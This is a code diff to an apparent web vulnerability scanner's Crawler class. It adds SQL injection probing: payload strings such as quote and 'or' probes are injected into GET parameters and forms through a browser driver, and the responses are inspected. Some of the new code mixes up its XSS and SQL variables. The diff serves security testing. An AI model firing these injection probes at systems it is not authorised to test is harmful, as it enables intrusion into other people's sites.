@@ -541,13 +541,30 @@ class Crawler:
             if parameter:
                 for payload_template in sql_payloads:
                     
-                    # if "=" in parameter:
-                    #     (key,value) = parameter.split("=",1)
-                    # else:
-                    #     (key,value) = (parameter, "")
+                    (lookup_id, payload) = self.arm_payload(payload_template)
                     
-                    # value = payload
-                    print(payload_template)
+                    if "=" in parameter:
+                        (key,value) = parameter.split("=", 1)
+                    else:
+                        (key,value) = (parameter, "")
+                        
+                    value = payload
+                    
+                    self.use_payload(lookup_id, (vector,key,payload))
+                    
+                    attack_query = purl.query.replace(parameter, key+"="+value)
+                    
+                    attack_vector = vector.replace(purl.query, attack_query)
+                    print("--Attack vector: ", attack_vector)
+                    
+                    driver.get(attack_vector)
+                    
+                    inspect_result = self.inspect_attack(vector)
+                    if inspect_result:
+                        successful_xss = successful_xss.union()
+                        logging.info("Found injection, don't test all")
+                        break
+                    
         return  successful_sql  #implement this
     
     def attack_sql_event(self):
@@ -661,15 +678,14 @@ class Crawler:
         # xss_payloads = ['<a href="" jaekpot-attribute="'+alert_text+'">jaekpot</a>']
         return xss_payloads
     
-    def get_sql_payload(self):  #reference sql payload https://github.com/payloadbox/sql-injection-payload-list need to add more
-        sql_payloads = ['\'',
-                        '\'\'',
-                        '\`',
-                        '\`\`',
-                        ',',
-                        '\;',
-                        '\' or \"',
-                        '''.,'''
+    def get_sql_payload(self):  #sql injection payloads https://github.com/payloadbox/sql-injection-payload-list
+        sql_payloads = ['sqlinjection\'',
+                        'sqlinjection\'\'',
+                        'sqlinjection\`',
+                        'sqlinjection\`\`',
+                        'sqlinjection,',
+                        'sqlinjection\;',
+                        'sqlinjection\' or \"'
                         ]
         return sql_payloads
     
@@ -913,7 +929,7 @@ class Crawler:
             
         return successful_xss
 
-    def attack_sql(self): #attack simple reflect SQL
+    def attack_sql(self): #attack SQL
         driver = self.driver
         successful_sql = set()
         vectors = self.extract_vectors()
@@ -922,6 +938,7 @@ class Crawler:
         
         done = set()
         
+        # attack in get        
         for edge in self.graph.edges:
             if edge.value.method == "get":
                 if not check_edge(driver, self.graph, edge):
@@ -940,11 +957,24 @@ class Crawler:
                 successful_sql = successful_sql.union(get_sql)
             get_c += 1
         
-        #attack event 
-        
-        
-        
-        #attack form 
+     
+        #attack form
+        forms_to_attack = [ (vector_type,vector) for (vector_type, vector) in vectors if vector_type == "form" ]
+        form_c = 0
+        for (vector_type,vector) in forms_to_attack:
+            print("Progress (forms): ", form_c , "/", len(forms_to_attack))
+            if vector_type == "form":
+                form_sql = self.path_attack_form(driver, vector)
+
+                # Save to file
+                f = open("form_xss.txt", "a+")
+                for xss in form_sql:
+                    if xss in self.attack_lookup_table:
+                        f.write(str(self.attack_lookup_table)  + "\n")
+
+                successful_xss = successful_xss.union(form_sql)
+            form_c += 1   
+
         print("-"*50)
         print("Successful attacks: ", len(successful_sql))
         print("-"*50)
